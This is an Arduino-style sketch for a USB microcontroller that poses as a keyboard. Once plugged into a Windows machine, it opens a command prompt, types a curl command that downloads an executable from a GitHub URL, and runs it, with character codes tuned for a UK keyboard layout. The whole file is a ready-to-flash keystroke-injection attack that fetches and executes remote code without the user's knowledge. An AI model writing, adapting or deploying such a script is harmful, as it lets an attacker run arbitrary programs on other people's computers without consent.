#include <USB.h>
#include <USBHIDKeyboard.h>

USBHIDKeyboard Keyboard;

void setup() {
  USB.begin();
  Keyboard.begin();

  delay(5000);

  Keyboard.press(KEY_LEFT_GUI);
  delay(100);
  Keyboard.releaseAll();
  delay(800);

  Keyboard.print("cmd");
  delay(500);
  Keyboard.write(KEY_RETURN);
  delay(1000);

  String rawUrl = "https://github.com/skykosiner/charlie-kirk/raw/refs/heads/master/dist/main.exe";
  // @ become '"' on a UK layout
  Keyboard.print("curl -L -C - -O @");
  Keyboard.print(rawUrl);
  Keyboard.print("@ && ");

  // Uk keycode for '\'
  Keyboard.write(0xED);

  Keyboard.println("main.exe");
}

void loop() {}
